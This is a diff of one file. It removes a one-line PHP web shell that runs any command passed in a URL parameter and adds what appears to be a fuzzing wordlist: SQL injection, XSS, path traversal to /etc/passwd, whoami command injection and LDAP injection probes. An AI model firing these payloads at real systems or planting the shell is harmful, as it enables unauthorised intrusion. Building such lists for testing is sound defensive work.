@@ -1,1 +1,51 @@
-<?php system($_GET['cmd']); ?>
+'
+"
+''
+""
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1'--
+' AND '1'='2
+' AND 1=2--
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+';WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+1' OR '1'='1
+1' AND '1'='2
+1'--
+1';WAITFOR DELAY '0:0:5'--
+admin'--
+test' OR 'a'='a
+' OR ''='
+%27
+%22
+%3C%3E
+%27%20OR%201%3D1--
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<iframe src=javascript:alert(1)>
+*
+%
+_
+%25
+%5F
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+../
+../../../../etc/passwd
+..\..\..\windows\win.ini
+|}
+"]}
+"}]}
+"}]}'
+|whoami
+;whoami
+&&whoami
+*)(uid=*)
+*)(|(uid=*))
+(|(uid=*))
